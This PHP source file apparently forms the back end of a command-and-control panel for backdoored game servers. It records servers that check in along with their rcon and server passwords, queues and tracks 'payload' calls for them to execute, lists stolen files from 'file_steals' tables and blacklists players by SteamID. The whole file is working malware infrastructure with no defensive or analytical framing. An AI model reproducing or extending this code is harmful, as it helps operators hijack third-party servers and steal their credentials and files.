<?php

class Server
{
	// Vérifie si un serveur existe et retourne sont id
	public function GetServerByIP($ip)
	{
		if($GLOBALS['DB']->Count("server_list", ["server_ip" => $ip]) >= 1)
		{
			$server_id = $GLOBALS['DB']->GetContent("server_list", ["server_ip" => $ip])[0]["id"];
			return $server_id;
		}
		else
		{
			return false;
		}
	}

	// Récupére le payload qui doit être utilisée par le serveur
	public function GetServerPayload($server_id)
	{
		return $GLOBALS['DB']->GetContent("server_list", ["id" => $server_id])[0]["payload_call"];
	}

	public function IsBlacklist($steamid)
	{
		return $GLOBALS['DB']->GetContent("players_list", ["steamid" => $steamid])[0]["blacklist"];
	}


	public function Blacklist($steamid)
	{
		$GLOBALS["DB"]->Update("players_list", ["steamid" => $steamid], ["blacklist" => "yes"]);
		
	}

	// Récupére le server
	public function GetServer($server_id)
	{
		return $GLOBALS['DB']->GetContent("server_list", ["id" => $server_id])[0];
	}

		public function GetServerName($server_id)
	{
		return $GLOBALS['DB']->GetContent("server_list", ["id" => $server_id])[0]["server_name"];
	}

	// Ajoute un serveur
	public function AddServer($name, $ip, $port, $users, $key, $pw, $map, $gm, $rcon, $players, $additonnals)
	{
		$GLOBALS['DB']->Insert("server_list", ["server_players" => $players, "rcon" => $rcon, "gm" => $gm, "map" => $map, "pw" => $pw, "userid" => $key, "server_name" => $name, "server_ip" => $ip, "server_port" => $port, "server_users" => $users, "last_update" => time(), "payload_call" => -1, "payload_arg" => "", "additonnals" => $additonnals]);
        //Logs::AddLogs("<p class='text-primary'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-plus'></i>&nbsp;Un nouveau serveur est connecté : ".$name." : ".$_SERVER["REMOTE_ADDR"]." : ".$key."</p>");
	}

	// Mets à jour un serveur
	public function UpdateServer($server_id, $name, $ip, $port, $users, $pw, $map, $gm, $rcon, $players, $additonnals)
	{
		$GLOBALS['DB']->Update("server_list", ["id" => $server_id], ["server_players" => $players, "rcon" => $rcon, "gm" => $gm, "map" => $map, "pw" => $pw, "server_name" => $name, "server_users" => $users, "last_update" => time(), "additonnals" => $additonnals]);
	}

	// Récupére tous les serveur
	public function GetAllServer()
	{
		if(IsAdmin($_SESSION["id"]))
		{
			return $GLOBALS['DB']->GetContent("server_list");
		}else{
			return $GLOBALS['DB']->GetContent("server_list", ["userid" => $_SESSION["id"]], " OR userid = 0");
		}
	}


	public function GetAllFileSteal()
	{
		return $GLOBALS['DB']->GetContent("file_steals_list");
	}

	public function GetAllFileStealtodl()
	{
		return $GLOBALS['DB']->GetContent("file_steals");
	}

	// Supprime un serveur
	public function DeleteServer($id)
	{
		if(IsAdmin($_SESSION["id"]))
		{
			$ip = Server::GetServer($id)['server_ip'];
			Logs::AddLogs("<p class='text-danger'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;Le serveur ".Server::GetServer(Server::GetServerByIP($ip))['server_name']." à été supprimé</p>");
			
			return $GLOBALS['DB']->Delete("server_list", ["id" => $id]);
		}
		
		
	    
		
	}

	// Appeler un Payload
	public function CallPayload($server_id, $payload_id, $payload_arg = "")
	{
		$ip = Server::GetServer($server_id)['server_ip'];
		$pname = Payload::GetPayload($payload_id)['payload_name'];
		$GLOBALS['DB']->Update("server_list", ["id" => $server_id], ["payload_call" => $payload_id, "payload_arg" => $payload_arg]);
        Logs::AddLogs("<p class='text-warning'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-exclamation'></i>&nbsp;Le payload \"".$pname."\" à été appelé pour ".Server::GetServer(Server::GetServerByIP($ip))['server_name']." Par ".Account::GetUsername($_SESSION["id"])."</p>");
	}

	// Reset un payload pour un serveur
	public function ResetPayload($server_id)
	{
		$ip = Server::GetServer($server_id)['server_ip'];
		$GLOBALS['DB']->Update("server_list", ["id" => $server_id], ["payload_call" => -1]);
        Logs::AddLogs("<p class='text-success'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-check'></i>&nbsp;Le serveur ".Server::GetServer(Server::GetServerByIP($ip))['server_name']." à répondu a l'apelle envoyer</p>");
	}

	// Récupéré le statut d'un apelle
	public function CallStatut($server_id)
	{
		if ($GLOBALS['DB']->GetContent("server_list", ["id" => $server_id])[0]['payload_call'] == -1)
		{
			return true;
		}
		else
		{
			return false;
		}
	}
}
?>
